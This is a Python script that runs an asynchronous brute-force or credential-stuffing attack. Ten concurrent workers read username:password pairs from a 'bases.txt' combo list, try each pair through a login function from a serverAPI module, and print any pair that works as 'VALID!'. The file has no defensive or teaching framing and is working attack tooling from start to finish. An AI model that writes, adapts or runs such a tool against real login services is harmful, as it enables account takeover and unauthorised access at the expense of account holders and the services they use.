import asyncio
import aiohttp

from serverAPI import login

THREADS_COUNT = 10
DEBUG = False


def read_base() -> list:
    with open('bases.txt', 'r') as base:
        return base.readlines()


async def worker(queue: asyncio.Queue, thread_id: int):
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=50)) as client:
        while True:
            string = await queue.get()
            username, password = string.replace('\n', '').split(':')
            result = await login(client, username, password)
            queue.task_done()
            if result:
                print(f'VALID! {username}:{password}')
                queue._finished.set()
            if DEBUG and not result:
                print(f'Thread ID: {thread_id} with username: {username} and password: {password} returns: {result}')


async def main():
    tasks = []
    queue = asyncio.Queue()
    strings = read_base()
    for string in strings:
        queue.put_nowait(string)

    for thread_id in range(THREADS_COUNT):
        task = asyncio.create_task(worker(queue, thread_id))
        tasks.append(task)

    #started_at = time.monotonic()
    await queue.join()
    #end_at = time.monotonic() - started_at

    for task in tasks:
        task.cancel()

    await asyncio.gather(*tasks, return_exceptions=True)
    print('\n=========================================')
    print('Bruteforce is finished!')
    #print(f'total time: {end_at - started_at}')


asyncio.run(main())
